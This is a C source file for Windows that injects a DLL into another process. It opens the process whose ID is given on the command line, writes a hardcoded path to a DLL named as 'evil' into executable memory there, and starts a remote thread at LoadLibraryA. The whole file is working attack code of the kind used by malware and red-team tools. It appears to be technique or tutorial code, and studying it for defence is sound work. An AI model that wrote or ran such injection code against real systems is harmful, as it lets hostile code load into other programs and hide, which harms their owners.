#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char evilDLL[] = "D:\\tribenine\\dllinj\\mylib.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  LPVOID rb; // remote buffer

  // handle to kernel32 and pass it to GetProcAddress
  HMODULE hKernel32 = GetModuleHandle("Kernel32");

  if (!hKernel32) {
    fputs("GetModuleHandle failed", stderr);
    return 1;
  }

  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

  if (!lb) {
    fputs("GetProcAddress failed", stderr);
    return 1;
  }

  // parse process ID
  if ( atoi(argv[1]) == 0) {
      printf("PID not found :( exiting...\n");
      return -1;
  }
  printf("PID: %i\n", atoi(argv[1]));
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));

  if (!ph) {
    fputs("OpenProcess failed", stderr);
    return 1;
  }

  // allocate memory buffer for remote process
  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  if (!rb) {
    fputs("VirtualAllocEx failed", stderr);
    return 1;
  }

  // "copy" evil DLL between processes
  

  if (!WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL)) {
    fputs("WriteProcessMemory failed", stderr);
    return 1;
  }

  // our process start new thread
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);

  if (!rt) {
    fputs("CreateRemoteThread failed", stderr);
    return 1;
  }

  CloseHandle(ph);
  return 0;
}

